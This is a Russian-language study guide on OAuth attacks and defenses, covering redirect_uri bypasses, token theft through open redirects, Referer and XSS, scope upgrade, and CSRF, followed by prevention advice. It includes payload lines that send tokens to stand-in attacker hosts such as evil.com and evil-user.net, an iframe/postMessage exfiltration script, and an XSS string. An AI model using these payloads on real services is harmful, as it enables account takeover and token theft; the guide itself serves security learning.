*  [Разведка](#Разведка)
*  [Уязвимости в клиентском приложении OAuth](#Уязвимости-в-клиентском-приложении-OAuth)
  *  [Неправильная реализация неявного типа предоставления](#Неправильная-реализация-неявного-типа-предоставления)
  *  [Межсайтовая подделка запроса (CSRF)](#Межсайтовая-подделка-запроса-CSRF)
* [Уязвимости в службе OAuth](#Уязвимости-в-службе-OAuth)
  * [Утечка кодов авторизации и токенов доступа](#Утечка-кодов-авторизации-и-токенов-доступа)
    * [Некорректная проверка redirect_uri](#)
    * [Кража кодов и токенов доступа через страницу прокси](#)
    * [Кража токена OAuth через Referer](#Кража-токена-OAuth-через-Referer)
    * [Выполнение XSS через redirect_uri](#Выполнение-XSS-через-redirect_uri)
    * [Раскрытие закрытого ключа OAuth](#Раскрытие-закрытого-ключа-OAuth)
    * [Нарушение правил использования authorization code](#Нарушение-правил-использования-authorization-code)  
  * [Некорректная проверка области действия](#Некорректная-проверка-области-действия)
    * [Обновление области действия: поток кода авторизации](#Обновление-области-действия-поток-кода-авторизации)
    * [Обновление области: неявный поток](#Обновление-области-неявный-поток)
  * [Непроверенная регистрация пользователя](#Непроверенная-регистрация-пользователя)
* [Как предотвратить уязвимости аутентификации OAuth](#Как-предотвратить-уязвимости-аутентификации-OAuth)

# Разведка

> Если используется внешняя служба OAuth, необходимо идентифицировать конкретного провайдера по имени хоста, на который отправляется запрос на авторизацию.

Узнав имя хоста сервера авторизации, вы всегда должны попытаться отправить запрос GET на следующие стандартные конечные точки:
```
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```
Они часто возвращают файл конфигурации JSON, содержащий ключевую информацию, например, подробности дополнительных функций, которые могут поддерживаться


# Уязвимости в клиентском приложении OAuth

> Спецификация OAuth определена относительно слабо. Это особенно верно в отношении реализации клиентским приложением. В потоке OAuth много подвижных частей, с большим количеством необязательных параметров и настроек конфигурации в каждом типе предоставления, что означает, что есть много возможностей для неправильных конфигураций.
___________
## Неправильная реализация неявного типа предоставления

> Из-за опасностей, возникающих при отправке токенов доступа через браузер, неявный тип предоставления в основном рекомендуется для одностраничных приложений. Однако он также часто используется в классических клиент-серверных веб-приложениях из-за своей относительной простоты.

* Токен доступа отправляется из службы OAuth в клиентское приложение через браузер пользователя в виде фрагмента URL. 
* Клиентское приложение получает доступ к токену с помощью JavaScript.

> Проблема в том, что если приложение хочет сохранить сеанс после того, как пользователь закрывает страницу, ему необходимо где-то сохранить текущие данные пользователя (обычно идентификатор пользователя и токен доступа).

* Клиентское приложение часто отправляет эти данные на сервер в запросе POST, а затем назначает пользователю сеансовый cookie, фактически регистрируя его.
> Этот запрос примерно эквивалентен запросу отправки формы, который может быть отправлен как часть классического входа на основе пароля. Однако в этом сценарии у сервера нет никаких секретов или паролей для сравнения с отправленными данными, что означает, что он неявно доверен.

Если клиентское приложение не проверит должным образом, что токен доступа соответствует другим данным в запросе. В этом случае пользователь может просто изменить параметры, отправленные на сервер, чтобы выдать себя за любого пользователя.
________
## Межсайтовая подделка запроса (CSRF)

Приложения, которые не проверяют наличие действительного CSRF-токена в OAuth callback, уязвимы. Это можно эксплуатировать, инициировав OAuth-поток и перехватив callback (`https://example.com/callback?code=AUTHORIZATION_CODE`). Этот URL можно использовать в CSRF-атаках.

> Клиент ДОЛЖЕН реализовать защиту от CSRF для своего URI перенаправления (`redirection URI`). Обычно это достигается путем требования, чтобы любой запрос, отправленный на конечную точку URI перенаправления, включал значение, которое привязывает запрос к аутентифицированному состоянию пользовательского агента. Клиенту СЛЕДУЕТ использовать параметр запроса `state` для передачи этого значения серверу авторизации при выполнении запроса на авторизацию.

________
# Уязвимости в службе OAuth

## Утечка кодов авторизации и токенов доступа

В зависимости от типа гранта, либо код, либо токен отправляется через браузер жертвы на конечную точку /callback, указанную в параметре redirect_uri запроса авторизации. Если служба OAuth не может должным образом проверить этот URI, злоумышленник может сконструировать атаку, подобную CSRF, обманом заставив браузер жертвы инициировать поток OAuth, который отправит код или токен на контролируемый злоумышленником redirect_uri.

В случае потока кода авторизации:
* украсть код жертвы до его использования.
* отправить этот код на законную конечную точку /callback клиентского приложения (исходный redirect_uri), чтобы получить доступ к учетной записи пользователя.
> В этом сценарии даже не нужно знать секрет клиента или полученный токен доступа. Пока есть действительный сеанс со службой OAuth, клиентское приложение просто завершит обмен кодом/токеном от имени злоумышленника, прежде чем войти в учетную запись.

> использование защиты состояния или одноразового кода не обязательно предотвращает эти атаки, поскольку злоумышленник может генерировать новые значения из своего собственного браузера.

Более безопасные серверы авторизации также потребуют отправки параметра `redirect_uri` при обмене кодом. Затем сервер может проверить, совпадает ли он с полученным в первоначальном запросе авторизации, и отклонить обмен, если нет. Поскольку это происходит в запросах от сервера к серверу через защищенный обратный канал, злоумышленник не может контролировать этот второй параметр `redirect_uri`.
________
### Некорректная проверка redirect_uri

> При аудите потока OAuth следует попробовать поэкспериментировать с параметром `redirect_uri`, чтобы понять, как он проверяется
```python
Добавить дополнительные значения к параметру redirect_uri по умолчанию и использовать несоответствия между анализом URI различными компонентами службы OAuth:
https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/

Отправить дубликаты параметров redirect_uri
https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net

Некоторые серверы также предоставляют особую обработку локальным URI, поскольку они часто используются во время разработки.
localhost.evil-user.net
```
* **Перенаправление на контролируемый домен для получения access token**
```python
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

* **Перенаправление на разрешенный Open URL для получения access token**
```python
https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com
https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F
```

> Реализации OAuth никогда не должны разрешать (whitelist) целые домены, а только конкретные URL-адреса, чтобы `redirect_uri` нельзя было указать на открытый редирект (Open Redirect).

Иногда необходимо изменить область видимости (`scope`) на недопустимую, чтобы обойти фильтр на `redirect_uri`:
```python
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```
________

### Кража кодов и токенов доступа через страницу прокси

* Одной из самых полезных уязвимостей для этой цели является открытое перенаправление.
  * выяснить, можно ли изменить параметр redirect_uri, чтобы он указывал на любые другие страницы в домене из белого списка.
```https://client-app.com/oauth/callback/../../example/path```
  * проверить их на наличие дополнительных уязвимостей
  * найти уязвимость, которая дает доступ к параметрам запроса (для типа неявного предоставления вам нужно извлечь фрагмент URL)
 ```python
<iframe src="https://oauth.oauth-server.net/auth?client_id=...&redirect_uri=https://example.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=..."></iframe>

<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
```
> Для неявного типа предоставления кража токена доступа не просто позволяет вам войти в учетную запись в клиентском приложении. Поскольку весь неявный поток происходит через браузер, можно использовать токен для выполнения собственных вызовов API на сервер ресурсов службы OAuth. Это может позволить извлекать конфиденциальные пользовательские данные, к которым вы обычно не можете получить доступ из веб-интерфейса клиентского приложения.

* JavaScript, который обрабатывает параметры запроса и фрагменты URL
> Например, небезопасные скрипты обмена сообщениями. В некоторых сценариях может потребоваться определить более длинную цепочку гаджетов, которая позволяет передавать токен через ряд скриптов, прежде чем в конечном итоге передать его на ваш внешний домен.
* Уязвимости XSS
Атрибут HTTPOnly обычно используется для файлов cookie сеанса, не получится получить к ним прямой доступ с помощью XSS. Украв код или токен OAuth, пользователь может получить доступ к учетной записи цели в его собственном браузере. Это дает гораздо больше времени для изучения данных пользователя и выполнения вредоносных действий, что значительно увеличивает серьезность уязвимости XSS.
________

### Кража токена OAuth через Referer

Когда нет возможности внедрить JavaScript (например, из-за ограничений CSP или строгой фильтрации), все равно можно использовать простую HTML-инъекцию для кражи кодов авторизации. Если указать параметр redirect_uri на страницу, на которой можно внедрить свой собственный HTML-контент, можно передать код через заголовок Referer.

* Например: ```img: <img src="evil-user.net">``` При попытке получить это изображение некоторые браузеры (например, Firefox) отправят полный URL-адрес в заголовке Referer запроса, включая строку запроса.

________
### Выполнение XSS через `redirect_uri`

```python
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```
________
### Раскрытие закрытого ключа OAuth

Некоторые приложения для Android/iOS можно декомпилировать, и закрытый ключ OAuth может быть доступен.
________
### Нарушение правил использования authorization code

> **Клиент НЕ ДОЛЖЕН использовать код авторизации более одного раза.**

Если код авторизации используется более одного раза, сервер авторизации ДОЛЖЕН отклонить запрос и (по возможности) ДОЛЖЕН отозвать все токены, ранее выданные на основе этого кода авторизации.
________

## Некорректная проверка области действия

> Полученный токен позволяет клиентскому приложению получить доступ только к области действия, одобренной пользователем. Но в некоторых случаях можено «обновить» токен доступа (украденный или полученный с помощью вредоносного клиентского приложения) с помощью дополнительных разрешений из-за некорректной проверки службой OAuth. Процесс выполнения этого зависит от типа предоставления.

### Обновление области действия: поток кода авторизации

> С типом предоставления кода авторизации данные пользователя запрашиваются и отправляются через защищенную связь сервер-сервер, которую сторонний пользователь обычно не может манипулировать напрямую. Однако все еще может быть возможно достичь того же результата, зарегистрировав свое собственное клиентское приложение в службе OAuth.

* Вредоносное клиентское приложение изначально запросило доступ к адресу электронной почты пользователя, используя область действия электронной почты OpenID.
* Как пользователь одобрит этот запрос, вредоносное клиентское приложение получает код авторизации.
* Поскольку атакующий контролирует свое клиентское приложение, он может добавить еще один параметр области действия в запрос обмена кодом/токеном, содержащий дополнительную область действия профиля:
```python
POST /token
Хост: oauth-authorization-server.com
…
client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
```
Если сервер не проверяет это на соответствие области из первоначального запроса авторизации, он иногда генерирует токен доступа с использованием новой области и отправляет его клиентскому приложению злоумышленника:
```python
{
"access_token": "z0y9x8w7v6u5",
"token_type": "Bearer",
"expires_in": 3600,
"scope": "openid email profile",
…
}
```
* Можно использовать свое приложение для выполнения необходимых вызовов API для доступа к данным профиля пользователя.

### Обновление области: неявный поток

Для неявного типа предоставления токен доступа отправляется через браузер, что означает, что злоумышленник может украсть токены, связанные с невиновными клиентскими приложениями, и использовать их напрямую. После кражи токена доступа он может отправить обычный запрос на основе браузера в конечную точку `/userinfo` службы OAuth, вручную добавив новый параметр области в процессе.

В идеале служба OAuth должна проверять это значение области действия по сравнению с тем, которое использовалось при создании токена.

## Непроверенная регистрация пользователя

При аутентификации пользователей через OAuth клиентское приложение делает неявное предположение, что информация, хранящаяся поставщиком OAuth, верна. Это может быть опасным предположением.

> Некоторые веб-сайты, предоставляющие службу OAuth, позволяют пользователям регистрировать учетную запись без проверки всех своих данных, включая адрес электронной почты в некоторых случаях. Можно воспользоваться этим, зарегистрировав учетную запись у поставщика OAuth, используя те же данные, что и у целевого пользователя, например, известный адрес электронной почты. Затем клиентские приложения могут позволить злоумышленнику войти в систему как жертва через эту мошенническую учетную запись у поставщика OAuth.

# Как предотвратить уязвимости аутентификации OAuth

**Для поставщиков услуг OAuth**

* Требуй от клиентских приложений регистрировать белый список допустимых `redirect_uris`. 
* По возможности используй строгое побайтовое сравнение для проверки URI во всех входящих запросах. 
* Разрешай только полные и точные совпадения, а не сопоставление с шаблоном. Это не позволяет получать доступ к другим страницам на доменах из белого списка.
* Принудительно используй параметр `state`. Его значение также должно быть привязано к сеансу пользователя, включая некоторые непредсказуемые, специфичные для сеанса данные, такие как хэш, содержащий файл cookie сеанса. Это помогает защитить пользователей от атак типа CSRF и значительно затрудняет использование любых украденных кодов авторизации.
* На сервере ресурсов убедись, что проверили, что токен доступа был выдан тому же `client_id`, который делает запрос.
* Следует проверить запрашиваемую область, чтобы убедиться, что она соответствует области, для которой токен был изначально предоставлен.

**Для клиентских приложений OAuth**

* Многие уязвимости вызваны простым непониманием того, что именно происходит на каждом этапе и как это может быть потенциально использовано.
* Используй параметр состояния `state`, даже если он не является обязательным.
* Отправь параметр `redirect_uri` не только в конечную точку `/authorization`, но и в конечную точку `/token`.
* При разработке мобильных или собственных клиентских приложений OAuth для настольных компьютеров часто невозможно сохранить `client_secret` в тайне. В таких ситуациях можно использовать механизм PKCE (RFC 7636) для обеспечения дополнительной защиты от перехвата или утечки кода доступа.
* Если используешь `id_token OpenID Connect`, убедись, что он правильно проверен в соответствии со спецификациями JSON Web Signature, JSON Web Encryption и OpenID.
* Будь осторожен с кодами авторизации — они могут быть переданы через заголовки Referer при загрузке внешних изображений, скриптов или содержимого CSS. Также важно не включать их в динамически генерируемые файлы JavaScript, поскольку они могут быть выполнены с внешних доменов через теги <script>.
